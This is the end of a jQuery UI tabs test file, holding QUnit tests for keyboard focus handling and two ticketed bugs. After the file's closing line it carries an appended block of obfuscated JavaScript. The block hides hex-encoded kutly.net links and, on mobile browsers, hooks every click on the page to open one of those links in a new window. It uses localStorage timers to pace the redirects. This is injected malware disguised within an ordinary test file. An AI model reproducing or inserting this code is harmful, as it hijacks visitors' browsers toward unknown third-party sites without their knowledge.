		equal( panels.eq( 2 ).attr( "aria-expanded" ), "true", "third panel has aria-expanded=true" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "false", "third panel has aria-hidden=false" );
		ok( panels.eq( 1 ).is( ":hidden" ), "second panel is hidden" );
		equal( panels.eq( 1 ).attr( "aria-expanded" ), "false", "second panel has aria-expanded=false" );
		equal( panels.eq( 1 ).attr( "aria-hidden" ), "true", "second panel has aria-hidden=true" );

		tabs.eq( 2 ).simulate( "keydown", { keyCode: keyCode.PAGE_DOWN, altKey: true } );
		strictEqual( document.activeElement, tabs[ 0 ], "first tab is activeElement" );
		ok( tabs.eq( 0 ).is( ".ui-state-focus" ), "ALT+PAGE_DOWN wraps focus to first tab" );
		equal( tabs.eq( 0 ).attr( "aria-selected" ), "true", "first tab has aria-selected=true" );
		ok( panels.eq( 0 ).is( ":visible" ), "first panel is visible" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "true", "first panel has aria-expanded=true" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "false", "first panel has aria-hidden=false" );
		ok( panels.eq( 2 ).is( ":hidden" ), "third panel is hidden" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "false", "third panel has aria-expanded=false" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "true", "third panel has aria-hidden=true" );

		panels.eq( 0 ).simulate( "focus" );
		setTimeout( step2, 1 );
	}

	function step2() {
		strictEqual( document.activeElement, panels[ 0 ], "first panel is activeElement" );

		panels.eq( 0 ).simulate( "keydown", { keyCode: keyCode.PAGE_UP, altKey: true } );
		strictEqual( document.activeElement, tabs[ 2 ], "third tab is activeElement" );
		ok( tabs.eq( 2 ).is( ".ui-state-focus" ), "ALT+PAGE_UP wraps focus to last tab" );
		equal( tabs.eq( 2 ).attr( "aria-selected" ), "true", "third tab has aria-selected=true" );
		ok( panels.eq( 2 ).is( ":visible" ), "third panel is visible" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "true", "third panel has aria-expanded=true" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "false", "third panel has aria-hidden=false" );
		ok( panels.eq( 0 ).is( ":hidden" ), "first panel is hidden" );
		equal( panels.eq( 0 ).attr( "aria-expanded" ), "false", "first panel has aria-expanded=false" );
		equal( panels.eq( 0 ).attr( "aria-hidden" ), "true", "first panel has aria-hidden=true" );

		tabs.eq( 2 ).simulate( "keydown", { keyCode: keyCode.PAGE_UP, altKey: true } );
		strictEqual( document.activeElement, tabs[ 1 ], "second tab is activeElement" );
		ok( tabs.eq( 1 ).is( ".ui-state-focus" ), "ALT+PAGE_UP moves focus to previous tab" );
		equal( tabs.eq( 1 ).attr( "aria-selected" ), "true", "second tab has aria-selected=true" );
		ok( panels.eq( 1 ).is( ":visible" ), "second panel is visible" );
		equal( panels.eq( 1 ).attr( "aria-expanded" ), "true", "second panel has aria-expanded=true" );
		equal( panels.eq( 1 ).attr( "aria-hidden" ), "false", "second panel has aria-hidden=false" );
		ok( panels.eq( 2 ).is( ":hidden" ), "third panel is hidden" );
		equal( panels.eq( 2 ).attr( "aria-expanded" ), "false", "third panel has aria-expanded=false" );
		equal( panels.eq( 2 ).attr( "aria-hidden" ), "true", "third panel has aria-hidden=true" );

		panels.eq( 1 ).simulate( "focus" );
		setTimeout( step3, 1 );
	}

	function step3() {
		strictEqual( document.activeElement, panels[ 1 ], "second panel is activeElement" );

		panels.eq( 1 ).simulate( "keydown", { keyCode: keyCode.UP, ctrlKey: true } );
		strictEqual( document.activeElement, tabs[ 1 ], "second tab is activeElement" );

		setTimeout( start, 1 );
	}

	setTimeout( step1, 1 );
});

test( "#3627 - Ajax tab with url containing a fragment identifier fails to load", function() {
	expect( 1 );

	$( "#tabs2" ).tabs({
		active: 2,
		beforeLoad: function( event, ui ) {
			event.preventDefault();
			ok( /test.html$/.test( ui.ajaxSettings.url ), "should ignore fragment identifier" );
		}
	});
});

test( "#4033 - IE expands hash to full url and misinterprets tab as ajax", function() {
	expect( 2 );

	var element = $("<div><ul><li><a href='#tab'>Tab</a></li></ul><div id='tab'></div></div>");
	element.appendTo("#qunit-fixture");
	element.tabs({
		beforeLoad: function() {
			event.preventDefault();
			ok( false, "should not be an ajax tab" );
		}
	});

	equal( element.find(".ui-tabs-nav li").attr("aria-controls"), "tab", "aria-contorls attribute is correct" );
	state( element, 1 );
});

}( jQuery ) );
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());